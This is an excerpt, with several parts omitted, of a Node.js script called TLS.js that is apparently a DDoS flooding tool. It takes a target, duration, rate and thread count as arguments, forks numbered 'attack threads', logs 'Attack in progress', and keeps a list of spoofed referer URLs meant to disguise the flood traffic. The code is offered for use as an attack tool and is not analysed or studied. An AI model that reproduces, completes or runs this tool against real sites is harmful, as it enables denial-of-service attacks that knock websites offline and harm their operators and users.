...
if (process.argv.length < 6) { console.log(`Command:\nnode TLS.js <target> <time> <rate> <threads>`); process.exit(); }
...
const getCurrentTime = () => {
   ...
   const seconds = now.getMinutes().toString().padStart(2, '0');
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.log(`Information：${getCurrentTime()} Title：${getTitleFromHTML(data)}`);
   })
   .catch((error) => {
     if (error.message === '请求超时') {
       console.log(`Information：${getCurrentTime()} Request timed out.`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`Information：${getCurrentTime()} Title：${extractedTitle} {error.response.status}`);
     } else {
       console.log(`Information：${getCurrentTime()} ${error.message}`);
     }
   });
}
...
if (cluster.isMaster){
 console.clear();
 console.log(`Information: ${getCurrentTime()}`)
 console.log(`------------------------------------------`)
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`Information：${getCurrentTime()} Attack thread ${i} Started`);
 }
 console.log(`Information：${getCurrentTime()} Attack in progress.`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`Information：${getCurrentTime()} Attack Stop `);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
...
const refers = [
 ...
 "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
 "https://help.baidu.com/searchResult?keywords=",
 "https://play.google.com/store/search?q=",
 "https://pornhub.com/",
 "https://r.search.yahoo.com/",
